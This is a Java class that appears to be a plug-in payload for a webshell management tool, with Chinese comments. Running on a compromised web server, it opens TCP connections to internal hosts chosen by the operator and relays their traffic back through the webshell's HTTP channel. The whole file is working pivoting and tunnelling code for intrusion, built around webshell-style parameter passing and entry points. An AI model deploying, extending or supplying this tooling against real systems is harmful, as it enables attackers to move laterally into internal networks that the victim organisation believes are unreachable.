import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * 端口映射类 - 简化版的点对点隧道
 * 将内网指定主机:端口映射到本地端口，无需SOCKS5协议解析
 * 
 * 工作原理：
 * 1. 用户指定内网目标IP和端口
 * 2. 创建到目标的TCP连接
 * 3. 在webshell端建立数据转发隧道
 * 4. 本地应用直接连接本地端口，数据通过HTTP隧道转发
 */
public class PortMapping {
    private HashMap parameterMap;
    
    public static String extraData;
    public static Object Session;
    
    // 静态映射存储：mappingId -> 目标连接信息
    private static Map<String, SocketChannel> activeMappings = new ConcurrentHashMap<>();
    private static Map<String, String> mappingTargets = new ConcurrentHashMap<>();

    public PortMapping() {
    }

    public boolean equals(Object paramObject) {
        try {
            this.parameterMap = (HashMap)paramObject;
            this.Session = this.parameterMap.get("httpSession");
        } catch (Exception e) {
            return false;
        }
        return true;
    }
    
    public String toString() {
        this.parameterMap.put("result", this.run().getBytes());
        this.parameterMap = null;
        return null;
    }
    
    /**
     * 主入口方法，根据methodName分发到具体功能
     */
    public String run() {
        String methodName = this.get("methodName");
        try {
            if (methodName == null) {
                return "error:methodName is null";
            }
            
            if (methodName.equals("createMapping")) {
                String result = this.createMapping();
                return result;
            } else if (methodName.equals("closeMapping")) {
                this.closeMapping();
                return "ok";
            } else if (methodName.equals("forwardData")) {
                this.forwardData();
                return "ok";
            } else if (methodName.equals("readData")) {
                byte[] data = this.readData();
                if (data != null) {
                    return "ok" + base64encode(data);
                } else {
                    return "error:no data or connection closed";
                }
            } else if (methodName.equals("getStatus")) {
                return this.getMappingStatus();
            } else if (methodName.equals("clearAllMappings")) {
                this.clearAllMappings();
                return "ok";
            } else {
                return "error:methodName not supported: " + methodName;
            }
        } catch (Exception e) {
            return "error:" + e.getMessage();
        }
    }

    /**
     * 创建端口映射
     * 参数：
     * - mappingId: 映射标识符（唯一）
     * - targetIP: 内网目标IP
     * - targetPort: 内网目标端口
     */
    public String createMapping() throws Exception {
        String mappingId = this.get("mappingId");
        String targetIP = this.get("targetIP");
        String targetPort = this.get("targetPort");
        
        if (mappingId == null || targetIP == null || targetPort == null) {
            throw new Exception("mappingId, targetIP or targetPort is null");
        }
        
        int port = Integer.parseInt(targetPort);
        if (port <= 0 || port > 65535) {
            throw new Exception("Invalid target port number: " + port);
        }
        
        // 检查映射是否已存在
        if (activeMappings.containsKey(mappingId)) {
            SocketChannel existing = activeMappings.get(mappingId);
            try {
                existing.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
            activeMappings.remove(mappingId);
            mappingTargets.remove(mappingId);
        }
        
        // 创建到目标的连接
        SocketChannel targetChannel = SocketChannel.open();
        targetChannel.configureBlocking(true); // 使用阻塞模式更稳定
        targetChannel.socket().setSoTimeout(10000); // 10秒超时
        targetChannel.socket().setKeepAlive(true);
        targetChannel.socket().setTcpNoDelay(true);
        targetChannel.connect(new InetSocketAddress(targetIP, port));
        
        // 验证连接
        if (!targetChannel.isConnected()) {
            targetChannel.close();
            throw new Exception("Failed to connect to target: " + targetIP + ":" + port);
        }
        
        // 存储映射信息
        activeMappings.put(mappingId, targetChannel);
        mappingTargets.put(mappingId, targetIP + ":" + port);
        
        return "ok:mapping_created:" + mappingId + " -> " + targetIP + ":" + port;
    }

    /**
     * 关闭指定的端口映射
     */
    public void closeMapping() throws Exception {
        String mappingId = this.get("mappingId");
        
        if (mappingId == null) {
            throw new Exception("mappingId is null");
        }
        
        SocketChannel channel = activeMappings.get(mappingId);
        if (channel != null) {
            try {
                channel.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
            activeMappings.remove(mappingId);
            mappingTargets.remove(mappingId);
        }
    }

    /**
     * 转发数据到目标服务器
     */
    public void forwardData() throws Exception {
        String mappingId = this.get("mappingId");
        String data = this.get("extraData");
        
        if (mappingId == null || data == null) {
            throw new Exception("mappingId or extraData is null");
        }
        
        SocketChannel targetChannel = activeMappings.get(mappingId);
        if (targetChannel == null || !targetChannel.isConnected()) {
            throw new Exception("Mapping not found or disconnected: " + mappingId);
        }
        
        byte[] dataBytes = this.base64decode(data);
        ByteBuffer buffer = ByteBuffer.allocate(dataBytes.length);
        buffer.put(dataBytes);
        buffer.flip();
        
        while (buffer.hasRemaining()) {
            int written = targetChannel.write(buffer);
            if (written == 0) {
                // 避免无限循环
                Thread.sleep(1);
            }
        }
    }

    /**
     * 从目标服务器读取数据 - 优化版（用于自适应轮询）
     * 返回数据或抛出明确的错误类型以便客户端判断连接状态
     */
    public byte[] readData() throws Exception {
        String mappingId = this.get("mappingId");
        
        if (mappingId == null) {
            throw new Exception("CONNECTION_ERROR:mappingId is null");
        }
        
        SocketChannel targetChannel = activeMappings.get(mappingId);
        if (targetChannel == null) {
            throw new Exception("CONNECTION_NOT_FOUND:Mapping not found: " + mappingId);
        }
        
        // 快速检查连接状态
        if (!targetChannel.isConnected()) {
            activeMappings.remove(mappingId);
            mappingTargets.remove(mappingId);
            throw new Exception("CONNECTION_CLOSED:Target connection is closed: " + mappingId);
        }
        
        // 临时切换到非阻塞模式进行读取
        targetChannel.configureBlocking(false);
        
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            ByteBuffer buffer = ByteBuffer.allocate(8192);
            int totalBytesRead = 0;
            boolean hasReadData = false;
            
            // 快速读取，最多尝试20次（减少循环次数）
            for (int attempt = 0; attempt < 20; attempt++) {
                buffer.clear();
                int length = targetChannel.read(buffer);
                
                if (length > 0) {
                    hasReadData = true;
                    byte[] data = Arrays.copyOfRange(buffer.array(), 0, length);
                    bos.write(data);
                    totalBytesRead += length;
                    
                    // 尝试读取更多数据（非阻塞）
                    while (true) {
                        buffer.clear();
                        int moreLength = targetChannel.read(buffer);
                        if (moreLength > 0) {
                            byte[] moreData = Arrays.copyOfRange(buffer.array(), 0, moreLength);
                            bos.write(moreData);
                            totalBytesRead += moreLength;
                        } else if (moreLength == 0) {
                            // 没有更多数据，立即返回已读取的数据
                            break;
                        } else {
                            // 连接关闭 (length == -1)
                            if (totalBytesRead > 0) {
                                return bos.toByteArray();
                            } else {
                                activeMappings.remove(mappingId);
                                mappingTargets.remove(mappingId);
                                throw new Exception("CONNECTION_CLOSED:Peer closed connection: " + mappingId);
                            }
                        }
                    }
                    
                    // 有数据时快速返回，不等待
                    return bos.toByteArray();
                    
                } else if (length == 0) {
                    // 暂时没有数据
                    if (hasReadData) {
                        // 已有数据，立即返回
                        return bos.toByteArray();
                    } else {
                        // 短暂等待后继续（减少等待时间）
                        try {
                            Thread.sleep(2);
                        } catch (InterruptedException e) {
                            Thread.currentThread().interrupt();
                            break;
                        }
                    }
                } else {
                    // length == -1，连接被对方关闭
                    activeMappings.remove(mappingId);
                    mappingTargets.remove(mappingId);
                    
                    if (totalBytesRead > 0) {
                        // 返回已读取的数据
                        return bos.toByteArray();
                    } else {
                        throw new Exception("CONNECTION_CLOSED:Connection closed by peer: " + mappingId);
                    }
                }
            }
            
            // 如果没有读取到数据，返回空数组（而不是抛出异常）
            return bos.toByteArray();
            
        } catch (java.io.IOException e) {
            // 网络IO异常，连接可能已断开
            activeMappings.remove(mappingId);
            mappingTargets.remove(mappingId);
            throw new Exception("CONNECTION_IO_ERROR:IO Exception: " + e.getMessage());
        } finally {
            // 恢复阻塞模式
            try {
                if (targetChannel.isOpen()) {
                    targetChannel.configureBlocking(true);
                }
            } catch (Exception e) {
                // 如果恢复失败，说明连接已经有问题
                activeMappings.remove(mappingId);
                mappingTargets.remove(mappingId);
            }
            
            try {
                bos.close();
            } catch (Exception e) {
                // 忽略
            }
        }
    }

    /**
     * 获取映射状态
     */
    public String getMappingStatus() {
        StringBuilder status = new StringBuilder();
        status.append("ACTIVE_MAPPINGS:").append(activeMappings.size()).append("|");
        
        for (String mappingId : activeMappings.keySet()) {
            SocketChannel channel = activeMappings.get(mappingId);
            String target = mappingTargets.get(mappingId);
            boolean connected = channel != null && channel.isConnected();
            status.append("MAPPING_").append(mappingId).append(":").append(target)
                  .append(":").append(connected).append("|");
        }
        
        return "ok:" + status.toString();
    }

    /**
     * 清除所有映射
     */
    public void clearAllMappings() {
        for (SocketChannel channel : activeMappings.values()) {
            try {
                channel.close();
            } catch (Exception e) {
                // 忽略
            }
        }
        activeMappings.clear();
        mappingTargets.clear();
    }

    /**
     * 从参数映射中获取字符串值
     */
    public String get(String key) {
        Object value = this.parameterMap.get(key);
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
            return (String) value;
        }
        if (value instanceof byte[]) {
            try {
                return new String((byte[]) value, "UTF-8");
            } catch (Exception e) {
                return null;
            }
        }
        return value.toString();
    }

    /**
     * Base64解码
     */
    private byte[] base64decode(String text) throws Exception {
        String version = System.getProperty("java.version");
        byte[] result = null;
        try {
            if (version.compareTo("1.8") >= 0) {
                Class<?> Base64Class = Class.forName("java.util.Base64");
                Object decoder = Base64Class.getMethod("getDecoder", null).invoke(Base64Class, null);
                result = (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, text);
            } else {
                Class<?> Base64Class = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = Base64Class.newInstance();
                result = (byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, text);
            }
        } catch (Exception e) {
            throw new Exception("Base64 decode failed: " + e.getMessage());
        }
        return result;
    }

    /**
     * Base64编码
     */
    private static String base64encode(byte[] content) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        if (version.compareTo("1.8") >= 0) {
            Class<?> Base64Class = Class.forName("java.util.Base64");
            Object encoder = Base64Class.getMethod("getEncoder", null).invoke(Base64Class, null);
            result = (String)encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, new Object[]{content});
        } else {
            Class<?> Base64Class = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = Base64Class.newInstance();
            result = (String)encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, new Object[]{content});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }
}
